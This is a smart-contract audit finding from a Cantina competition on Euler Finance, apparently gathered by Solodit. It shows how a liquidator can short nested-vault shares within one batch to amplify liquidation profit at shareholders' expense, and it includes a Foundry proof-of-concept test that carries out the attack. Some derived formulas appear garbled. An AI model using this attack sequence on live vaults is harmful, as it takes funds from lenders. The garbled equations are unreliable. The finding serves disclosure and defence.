---
# Core Classification
protocol: Euler
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 54153
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/75df6661-6f99-4163-aadd-377cb8c1eb55
source_link: https://cdn.cantina.xyz/reports/cantina_competition_euler_may2024.pdf
github_link: none

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - services
  - yield_aggregator
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - 00xSEV
  - highbit
  - alix40
---

## Vulnerability Title

Liquidation proﬁt can be ampliﬁed via nested vaults and shorting 

### Overview

See description below for full details.

### Original Finding Content

## Liquidation Profit Amplification via Nested Vaults and Shorting

## Context
(No context files were provided by the reviewer)

## Description
Liquidation profit can be amplified via nested vaults and shorting. The Euler finance system is built to support nested vaults, which are vaults where the deposited asset is itself a vault share. This is promoted as a flexible and powerful feature of the platform.

Liquidation is a permissionless action taken by self-interested actors for a reward. A liquidation can be executed by any actor on any violator account that is unhealthy after a liquidation cooldown has elapsed. Timely liquidations are necessary and routine in a lending system.

Using nested vaults, liquidators can take a short position on vault shares during a liquidation, allowing them to extract significantly more value from liquidations than intended, at the cost of vault shareholders. Socializing debt instantly devalues vault shares. Holding a short position against vault shares when this happens will therefore be instantly profitable. In one transaction, liquidators can borrow vault shares and deposit them for cash, creating a position that is short vault shares.

The position is short because a drop in the price of vault shares (via debt socialization) will mean that the shares can be bought back at a lower price, with the remaining assets kept as profit. In this same transaction, they can:

- Liquidate one or more loans.
- Collect their reward.
- Buy back vault shares at a reduced price and close their position for a profit.

This can be done entirely within a single checks deferred context. No capital or additional risk is required from the liquidator.

### Consider this scenario:
- A vault eUSDC:
  - It accepts collateral in eWETH with an LTV of 0.95.
  - It has the default setting of debt socialization being enabled.
- A nested vault eeUSDC that has eUSDC as its cash asset.
- An underwater loan from the eUSDC vault taken out at price WETH-USDC = 2000.
  - Loan taken out when WETH-USDC = 2000 but the price has fallen to 1850.
  - Loan amount: 1,000,000 USDC.
  - Loan collateral: 526.316 WETH (now worth 900,658 USDC).
- Current eUSDC share price is 1.00.
- There is a 4:1 ratio of eUSDC shares in the eeUSDC vault to eUSDC shares in general circulation.

A liquidator then executes this batch of operations in a checks deferred context:

1. Take a short position against eUSDC vault shares:
   - Borrow all available eUSDC tokens from the eeUSDC vault. In this example, 4,210,526 eUSDC.
   - Redeem all eUSDC for USDC. Price is 1.00 so 4,210,526 USDC is received. **NOTE**: This has the effect of reducing the number of eUSDC shares which amplifies the effect of debt socialization on the share price.
   
2. Liquidate the underwater loan, causing share devaluation:
   - The vault transfers the debt at an (equivalent) discount of 24,342 USDC.
   - The vault socializes 99,342 worth of debt, reducing the share price to 0.905625 USDC/eUSDC.
   - Use some arbitrary market mechanism to sell the collateral and cover the transferred liability, keeping the discount reward.

3. The attacker buys back enough eUSDC to cover their liability from step 2 at a lowered price:
   - 4,210,526 eUSDC at 0.905625 costs 3,813,158 USDC.

4. The transaction concludes with profits:
   - 24,342 USDC reward for performing the liquidation.
   - 397,368 USDC from short selling. Note that this profit is 4 times larger than the debt socialized; this is due to the initial 4:1 ratio.

### Impact
The impact is financially large and also distorts incentives in the entire lending ecosystem. By shorting vault shares during liquidation:

1. Liquidators can amplify existing liquidation rewards, sometimes at high multipliers.
2. Liquidators can unfairly extract significant value from any debt socialization they trigger at further cost to shareholders.

It is not desirable or coherent that liquidators should profit from debt socialization at the cost of lenders. Liquidations, in this case, are effectively much more expensive than intended. Increased costs to lenders cause higher interest rates and poor capital efficiency. Furthermore, the true cost of liquidations becomes dynamic and hard to predict. Usually, it is a function of just cash and borrows, but now an additional factor has been added: the number of shares available for loan.

Creation of nested vaults and depositing shares in them are permissionless actions, but doing so creates elevated cost and risk for the base vault. There is nothing the base vault can do about this. This is a failure of risk isolation in the EVC/EVaults.

Further, all shareholders bear the extra costs of liquidation extracted from shorting vault shares via devaluation, but only shareholders with their shares deposited in nested vaults can gain some compensation by collecting interest. This creates an undesirable incentive where lenders are pushed to either:

1. Exit the system.
2. Deposit their shares in a nested vault. This makes more shares available for borrowing, which further increases the effect of shorting and the opportunity cost of not making shares available for borrowing.

This incentive will likely lead to an equilibrium where almost everyone deposits their shares in a nested vault or exits. This is not a coherent economic mechanism and leads to highly undesirable equilibria.

This attack extracts value from a vulnerable fixed pricing formula in a single transaction while contributing nothing substantial to the financial system in the way of price discovery or liquidity.

## Likelihood
Practically guaranteed. Euler Finance is planning to roll out nested vaults as one of its early products. Thus, conditions will be perfect for this attack.

Further:

1. Liquidations are an essential part of the normal economic functioning of EVaults. They are necessary and routine.
2. Creation of nested vaults is encouraged and promoted as a distinctive feature by Euler. Their core function is to make vault shares available for borrowing, which allows shorting.

## Recommendation
The root problem is that the vault share price does not accurately reflect their Net Present Value. The pricing equation of EVaults—dividing the total cash plus borrows by the total number of shares—is far too simplistic. It does not take into account how the vault shares interact with the wider borrowing ecosystem. In particular, nested vaults must fundamentally change the Net Present Value calculation, yet the pricing equation of EVaults is immutable.

Since a liquidation could happen at any future time and incur significant costs with certainty, these costs should be reflected in the current price the vault is willing to transact shares.

This structural problem is embedded in the core functioning of the EVC/EVaults; it cannot be fixed with a small, conceptually isolated, code change. Remedying the root cause of the problem requires careful thought and is thus outside the scope of this issue report. We recommend further detailed analysis.

## Analysis
Here is a relatively compact derivation for the excess cost of liquidations when the liquidator is shorting vault shares. Given total vault assets **a** before the liquidation and final assets **a'**, a debt socialization of size **r** and **q** shares being shorted. Let **x** be the initial share price, **x'** be the final share price and **u** be the number of outstanding shares. The loss **l** is:

```
l = a - a'
l = xu - x'u
l = r + q(x - x')
```

Consider a fraction **f** of the shares being shorted, then **q = fu**:

```
l = r + fu(x - x')
l = r + f(xu - x'u)
l = r + fl
l = 1 / (1 - f) * r
```

Now consider a vault with assets **a**, borrows **b**, and cash **c**, where **a = b + c**. There are now two cases to consider:

1. If **xq ≤ c**: The maximum number of shares that can be shorted **q** is limited only by the number available for borrowing. The attacker will borrow all available shares and use them for shorting.
2. If **xq > c**: The maximum number of shares that can be shorted is limited by the cash in the vault because once cash is totally depleted, shares cannot be used for further withdrawals.

Let us consider case 2; if there is only one loan to liquidate, then set **q = c/x**. If there are multiple loans, then after each loan is liquidated, it can be repaid, putting cash in the vault for further withdrawals. In general, the vault value lost will be a complex function summing over every loan being liquidated. A loose upper bound can be derived because one cannot withdraw more cash than was paid into the vault. Let **fc = c/a** be the fraction of cash in the vault and **fB = B/a** where **B** is the total value being repaid by the liquidator. Giving these bounds:

```
(1 - fc) / r ≤ l < (1 - fc - fB) / r
```

A tighter bound is much more complicated. In the limit of many small loans and a fixed ratio of value socialized to value repaid **fr = r/B**, it can be calculated analytically. Without loss of generality, consider a vault where the initial share price is **x = a/u = 1**. After many small repays and withdrawals, the final share price will be **x'**, then:

```
β = 1 / fr + 1 / x' = (a - c)β^{-1} (a - B - c - r)^{1 - β}
l = u(1 - x')
```

## Proof of Concept
Place the file in the `euler-vault-kit` repo in directory `test/audit`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {DeployPermit2} from "permit2/test/utils/DeployPermit2.sol";
import {EthereumVaultConnector} from "ethereum-vault-connector/EthereumVaultConnector.sol";
import {IEVC} from "ethereum-vault-connector/interfaces/IEthereumVaultConnector.sol";
import {IVault} from "ethereum-vault-connector/interfaces/IVault.sol";
import {GenericFactory} from "../../src/GenericFactory/GenericFactory.sol";
import {EVault} from "../../src/EVault/EVault.sol";
import {ProtocolConfig} from "../../src/ProtocolConfig/ProtocolConfig.sol";
import {SequenceRegistry} from "../../src/SequenceRegistry/SequenceRegistry.sol";
import "../../src/EVault/shared/Constants.sol";
import {Dispatch} from "../../src/EVault/Dispatch.sol";
import {Initialize} from "../../src/EVault/modules/Initialize.sol";
import {Token} from "../../src/EVault/modules/Token.sol";
import {Vault} from "../../src/EVault/modules/Vault.sol";
import {Borrowing} from "../../src/EVault/modules/Borrowing.sol";
import {Liquidation} from "../../src/EVault/modules/Liquidation.sol";
import {BalanceForwarder} from "../../src/EVault/modules/BalanceForwarder.sol";
import {Governance} from "../../src/EVault/modules/Governance.sol";
import {RiskManager} from "../../src/EVault/modules/RiskManager.sol";
import {IEVault, IERC20} from "../../src/EVault/IEVault.sol";
import {IPriceOracle} from "../../src/interfaces/IPriceOracle.sol";
import {Base} from "../../src/EVault/shared/Base.sol";
import {Errors} from "../../src/EVault/shared/Errors.sol";
import {TestERC20} from "../../test/mocks/TestERC20.sol";
import {MockBalanceTracker} from "../../test/mocks/MockBalanceTracker.sol";
import {IRMTestDefault} from "../../test/mocks/IRMTestDefault.sol";
import {Pretty} from "../../test/invariants/utils/Pretty.sol";

struct Stats {
    uint256 attackerCollateralBefore;
    uint256 attackerLiabilityBefore;
    uint256 attackerCollateralAfter;
    uint256 attackerLiabilityAfter;
    uint256 violatorCollateralBefore;
    uint256 violatorLiabilityBefore;
    uint256 violatorCollateralAfter;
    uint256 violatorLiabilityAfter;
}

contract AmplifyLiquidateViaShorting is Test, DeployPermit2 {
    using Pretty for uint256;
    using Pretty for uint16;

    address admin;
    address feeReceiver;
    address protocolFeeReceiver;
    ProtocolConfig protocolConfig;
    MockPriceOracle oracle;
    MockBalanceTracker balanceTracker;
    address permit2;
    address sequenceRegistry;
    GenericFactory public factory;
    EthereumVaultConnector public evc;
    Base.Integrations integrations;
    Dispatch.DeployedModules modules;
    address initializeModule;
    address tokenModule;
    address vaultModule;
    address borrowingModule;
    address liquidationModule;
    address riskManagerModule;
    address balanceForwarderModule;
    address governanceModule;
    EVault public coreProductLine;
    EVault public escrowProductLine;
    TestERC20 USDC;
    TestERC20 WETH;
    IEVault public eUSDC;
    IEVault public eeUSDC; // nested vault that holds eUSDC as underlying asset
    IEVault public eWETH; // collateral for eUSDC and eeUSDC vault

    /* Constants for the PoC */
    uint256 constant eUSDC_UNDERLYING_BALANCE = 5_000_000e18 * 1e4 / WETH_BORROW_LTV; // eUSDC vault initial balance (in USDC)
    uint256 constant eWETH_UNDERLYING_BALANCE = eUSDC_UNDERLYING_BALANCE * 1e18 / INIT_ETH_PRICE; // eWETH vault initial balance (in WETH). Left alone.
    uint256 constant eWETH_FRACTIONS = 100;
    uint256 constant ATTACKER_eUSDC_eWETH_AMOUNT = eWETH_UNDERLYING_BALANCE - VIOLATOR_eWETH_AMOUNT;
    uint256 constant VIOLATOR_eWETH_AMOUNT = eWETH_UNDERLYING_BALANCE * WHALE1_eUSDC_FRACTION / eUSDC_FRACTIONS;
    uint256 constant VIOLATOR_USDC_BORROW_AMOUNT = VIOLATOR_eWETH_AMOUNT * INIT_ETH_PRICE * WETH_BORROW_LTV / (1e4 * 1e18) - 1;
    uint256 constant eUSDC_FRACTIONS = 100;
    uint256 constant WHALE1_eUSDC_FRACTION = 20;
    uint256 constant WHALE1_eUSDC_AMOUNT = eUSDC_UNDERLYING_BALANCE * WHALE1_eUSDC_FRACTION / eUSDC_FRACTIONS;
    uint256 constant WHALE2_eUSDC_FRACTION = 80;
    uint256 constant WHALE2_eUSDC_AMOUNT = eUSDC_UNDERLYING_BALANCE * WHALE2_eUSDC_FRACTION / eUSDC_FRACTIONS;
    uint256 constant INIT_ETH_PRICE = 2000e18;
    uint256 constant LOW_ETH_PRICE = 1850e18;
    uint16 constant WETH_BORROW_LTV = 0.95e4;

    function setUp() public virtual {
        assertEq(WHALE1_eUSDC_FRACTION + WHALE2_eUSDC_FRACTION, eUSDC_FRACTIONS);
        admin = vm.addr(1000);
        feeReceiver = makeAddr("feeReceiver");
        protocolFeeReceiver = makeAddr("protocolFeeReceiver");
        factory = new GenericFactory(admin);
        evc = new EthereumVaultConnector();
        protocolConfig = new ProtocolConfig(admin, protocolFeeReceiver);
        balanceTracker = new MockBalanceTracker();
        oracle = new MockPriceOracle();
        permit2 = deployPermit2();
        sequenceRegistry = address(new SequenceRegistry());
        integrations =
            Base.Integrations(address(evc), address(protocolConfig), sequenceRegistry,
            address(balanceTracker), permit2);
        initializeModule = address(new Initialize(integrations));
        tokenModule = address(new Token(integrations));
        vaultModule = address(new Vault(integrations));
        borrowingModule = address(new Borrowing(integrations));
        liquidationModule = address(new Liquidation(integrations));
        riskManagerModule = address(new RiskManager(integrations));
        balanceForwarderModule = address(new BalanceForwarder(integrations));
        governanceModule = address(new Governance(integrations));
        
        modules = Dispatch.DeployedModules({
            initialize: initializeModule,
            token: tokenModule,
            vault: vaultModule,
            borrowing: borrowingModule,
            liquidation: liquidationModule,
            riskManager: riskManagerModule,
            balanceForwarder: balanceForwarderModule,
            governance: governanceModule
        });

        EVault evaultImpl = new EVault(integrations, modules);
        vm.prank(admin); 
        factory.setImplementation(address(evaultImpl));

        USDC = new TestERC20("Fake USDC", "USDC", 18, false); // for convenience fake USDC has 18 decimals
        WETH = new TestERC20("Fake WETH", "WETH", 18, false);
        vm.label(address(USDC), "Fake USDC");
        vm.label(address(WETH), "Fake WETH");
        address unitOfAccount = address(USDC); // all vaults denominated in USDC
        
        eUSDC = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(USDC), address(oracle),
            unitOfAccount))
        );
        eUSDC.setInterestRateModel(address(new IRMTestDefault()));
        eUSDC.setMaxLiquidationDiscount(0.3e4);
        
        eeUSDC = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(eUSDC), address(oracle),
            unitOfAccount))
        );
        // Nested vault needs this flag set so that eUSDC can be transferred to sub-accounts.
        eeUSDC.setConfigFlags(CFG_EVC_COMPATIBLE_ASSET);
        eeUSDC.setInterestRateModel(address(new IRMTestDefault()));
        
        eWETH = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(WETH), address(oracle),
            unitOfAccount))
        );
        eWETH.setInterestRateModel(address(new IRMTestDefault()));
        
        // Set LTVs so that eWETH is collateral for both eUSDC and eeUSDC
        eUSDC.setLTV(address(eWETH), WETH_BORROW_LTV, WETH_BORROW_LTV, 0);
        eeUSDC.setLTV(address(eWETH), WETH_BORROW_LTV, WETH_BORROW_LTV, 0);
        
        vm.label(address(eUSDC), "eUSDC");
        vm.label(address(eeUSDC), "eeUSDC");
        vm.label(address(eWETH), "eWETH");
    }

    function test_AmplifyLiquidate() public {
        address attacker = makeAddr("attacker");
        uint160 prefix = uint160(attacker) & ~uint160(0xff);
        address attacker_eeUSDC = address(prefix | 0x01);
        address attacker_eUSDC = address(prefix | 0x02);
        address violator = makeAddr("violator");
        address eUSDCWhale1 = makeAddr("eUSDCWhale1");
        address eUSDCWhale2 = makeAddr("eUSDCWhale2");
        vm.label(attacker_eeUSDC, "attacker_eeUSDC");
        vm.label(violator, "Violator");
        
        WETH.mint(address(this), eWETH_UNDERLYING_BALANCE);
        USDC.mint(address(this), eUSDC_UNDERLYING_BALANCE);
        
        // Approvals
        WETH.approve(address(eWETH), type(uint256).max);
        USDC.approve(address(eUSDC), type(uint256).max);
        vm.prank(attacker); 
        USDC.approve(address(eUSDC), type(uint256).max);
        
        // eUSDC Approvals
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        vm.prank(eUSDCWhale1); 
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        vm.prank(eUSDCWhale2); 
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        vm.prank(attacker_eeUSDC); 
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        vm.prank(attacker); 
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        
        eWETH.deposit(VIOLATOR_eWETH_AMOUNT, violator);
        eUSDC.deposit(eUSDC_UNDERLYING_BALANCE * WHALE1_eUSDC_FRACTION / eUSDC_FRACTIONS , eUSDCWhale1);
        eUSDC.deposit(eUSDC_UNDERLYING_BALANCE * WHALE2_eUSDC_FRACTION / eUSDC_FRACTIONS , eUSDCWhale2);
        
        vm.startPrank(attacker); 
        // approve eWETH for both eUSDC and eeUSDC vault (as it is collateral for both)
        eWETH.approve(address(eUSDC), type(uint256).max);
        eWETH.approve(address(eeUSDC), type(uint256).max);
        vm.stopPrank();

        // Set initial prices
        oracle.setPrice(address(eUSDC), address(USDC), 1e18);
        oracle.setPrice(address(eWETH), address(USDC), INIT_ETH_PRICE);

        // Enable controllers and collaterals
        vm.startPrank(attacker);
        evc.enableController(attacker_eeUSDC, address(eeUSDC));
        evc.enableCollateral(attacker_eeUSDC, address(eWETH));
        vm.stopPrank();
        
        vm.startPrank(attacker);
        evc.enableController(attacker_eUSDC, address(eUSDC));
        evc.enableCollateral(attacker_eUSDC, address(eWETH));
        vm.stopPrank();
        
        vm.startPrank(violator);
        evc.enableController(violator, address(eUSDC));
        evc.enableCollateral(violator, address(eWETH));
        vm.stopPrank();
        
        vm.prank(eUSDCWhale2); 
        evc.enableController(eUSDCWhale2, address(eeUSDC));
        
        // Whale 2 now deposits all of their eUSDC into eeUSDC getting eeUSDC shares. We ' re going to steal from them.
        vm.startPrank(eUSDCWhale2);
        eeUSDC.deposit(eUSDC.balanceOf(eUSDCWhale2), eUSDCWhale2);
        vm.stopPrank();

        // Now have the violator take out a loan
        console.log("eUSDC USDC: %s", USDC.balanceOf(address(eUSDC)).pretty());
        console.log("Violator WETH: %s", VIOLATOR_eWETH_AMOUNT.pretty());
        console.log("Violator borrows: %s", VIOLATOR_USDC_BORROW_AMOUNT.pretty());

        vm.startPrank(violator);
        eUSDC.borrow(VIOLATOR_USDC_BORROW_AMOUNT, violator);
        vm.stopPrank();
        
        // Now deposit just enough risk collateral in attacker_eUSDC account to cover liquidation.
        // We don ' t include this in the accounting since normally you would sell the seized collateral to pay for this
        uint256 inverseFactor = 1e8 / (WETH_BORROW_LTV - 1) - 1e4; // 1/LTV - 1
        uint256 extraCollateralCapital = eWETH.balanceOf(violator) * inverseFactor / 1e4;
        eWETH.deposit(extraCollateralCapital, attacker_eUSDC);

        // WETH price drops substantially
        oracle.setPrice(address(eWETH), address(USDC), LOW_ETH_PRICE);
        logLiquidationCheck("violator", eUSDC, attacker, violator, address(eWETH), LOW_ETH_PRICE);

        IEVC.BatchItem[] memory items = new IEVC.BatchItem[](5);
        console.log("----- Before attack ----");
        logAccountBalances("violator", violator);
        logAccountBalances("attacker_eUSDC", attacker_eUSDC);
        logAccountBalances("attacker_eeUSDC", attacker_eeUSDC);
        logAccountBalances("attacker", attacker);

        Stats memory stats;
        (stats.violatorLiabilityBefore) = eUSDC.accountLiquidity(violator, true);
        (stats.attackerCollateralBefore,) = eUSDC.accountLiquidity(attacker_eUSDC, true);
        
        console.log("Attacker borrows %s eUSDC", WHALE2_eUSDC_AMOUNT.pretty());
        
        items[0] = IEVC.BatchItem({
            onBehalfOfAccount: attacker_eeUSDC,
            targetContract: address(eeUSDC),
            value: 0,
            data: abi.encodeCall(eeUSDC.borrow, (WHALE2_eUSDC_AMOUNT, attacker_eUSDC))
        });
        
        items[1] = IEVC.BatchItem({
            onBehalfOfAccount: attacker_eUSDC,
            targetContract: address(eUSDC),
            value: 0,
            data: abi.encodeCall(eUSDC.withdraw, (WHALE2_eUSDC_AMOUNT, attacker, attacker_eUSDC))
        });
        
        items[2] = IEVC.BatchItem({
            onBehalfOfAccount: attacker_eUSDC,
            targetContract: address(eUSDC),
            value: 0,
            data: abi.encodeCall(eUSDC.liquidate, (violator, address(eWETH), type(uint256).max, 0))
        });
        
        items[3] = IEVC.BatchItem({
            onBehalfOfAccount: attacker,
            targetContract: address(eUSDC),
            value: 0,
            data: abi.encodeCall(eUSDC.mint, (WHALE2_eUSDC_AMOUNT, attacker_eeUSDC))
        });
        
        items[4] = IEVC.BatchItem({
            onBehalfOfAccount: attacker_eeUSDC,
            targetContract: address(eeUSDC),
            value: 0,
            data: abi.encodeCall(eeUSDC.repay, (WHALE2_eUSDC_AMOUNT, attacker_eeUSDC))
        });

        Vm.Log[] memory entries;
        vm.recordLogs();
        vm.prank(attacker); 
        evc.batch(items);
        entries = vm.getRecordedLogs();
        
        (stats.attackerCollateralAfter, stats.attackerLiabilityAfter) = eUSDC.accountLiquidity(attacker_eUSDC, true);
        
        console.log("Attacker liquidation reward: %s",
            ((stats.attackerCollateralAfter - stats.attackerLiabilityAfter) - stats.attackerCollateralBefore).pretty()
        );
        
        console.log("----- After attack ----");
        for (uint256 i = 0; i < entries.length; i++) {
            if (entries[i].topics[0] == keccak256("DebtSocialized(address,uint256)")) {
                console.log("Debt Socialized: %s", uint256(abi.decode(entries[i].data, (uint256))).pretty());
            }
        }
    }

    function logAccountBalances(string memory s, address account) internal {
        logAccountBalances(s, evc.getAccountOwner(account), account);
    }

    function logAccountBalances(string memory s, address prank, address account) internal {
        uint256 bal;
        vm.startPrank(prank);
        console.log("");
        console.log("%s {", s);
        
        bal = USDC.balanceOf(account);
        console.log(" USDC: %s", bal.pretty());
        
        if ((bal = WETH.balanceOf(account)) > 0) {
            console.log(" WETH: %s", bal.pretty());
        }
        if ((bal = eUSDC.balanceOf(account)) > 0) {
            console.log(" eUSDC: %s", bal.pretty());
        }
        if ((bal = eeUSDC.balanceOf(account)) > 0) {
            console.log(" eeUSDC: %s", bal.pretty());
        }
        if ((bal = eWETH.balanceOf(account)) > 0) {
            console.log(" eWETH: %s", bal.pretty());
        }
        
        IEVault[] memory vs = new IEVault[](2);
        vs[0] = eUSDC;
        vs[1] = eeUSDC;
        
        for (uint256 i = 0; i < vs.length; i++) {
            address[] memory controllers = evc.getControllers(account);
            if (controllers.length > 0 && controllers[0] == address(vs[i])) {
                console.log(" %s { ", vs[i].name());
                (uint256 collateralValue, uint256 liabilityValue) = vs[i].accountLiquidity(account, true);
                console.log(" collateral: %s", collateralValue.pretty());
                console.log(" liability: %s", liabilityValue.pretty());
                console.log(" }");
            }
        }
        console.log("}");
        vm.stopPrank();
    }

    function logLiquidationCheck(string memory s, IEVault vault, address liquidator, address violator, address collateral, uint256 price) internal {
        (uint256 maxRepay, uint256 maxYield) = vault.checkLiquidation(liquidator, violator, collateral);
        console.log("");
        console.log("Liquidation stats %s {", s);
        console.log(" maxRepay: %s", maxRepay.pretty());
        console.log(" maxYield");
        console.log(" collat asset: %s", maxYield.pretty());
        
        uint256 maxYieldUOA = maxYield * price / 1e18;
        console.log(" unitOfAccount: %s", maxYieldUOA.pretty());
        console.log("}");

        // Within 0.01%
        assertGe(maxYieldUOA * 10001/10000, maxRepay, "maxYield does not cover maxRepay");
    }

    function calcDebtSocialization(IEVault vault, address liquidator, address violator, address collateral) internal returns (uint256 amount, uint256 percent) {
        (uint256 maxRepay, uint256 maxYield) = vault.checkLiquidation(liquidator, violator, collateral);
        uint256 debt = IERC20(vault.asset()).balanceOf(violator);
        require(maxRepay <= debt, "maxRepay > debt");

        // maxRepay < debt (otherwise no incentive)
        amount = debt - maxRepay;
        percent = 10_000 - 10_000 * maxRepay / debt;
    }
}
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Euler |
| Report Date | N/A |
| Finders | 00xSEV, highbit, alix40 |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_euler_may2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/75df6661-6f99-4163-aadd-377cb8c1eb55

### Keywords for Search

`vulnerability`

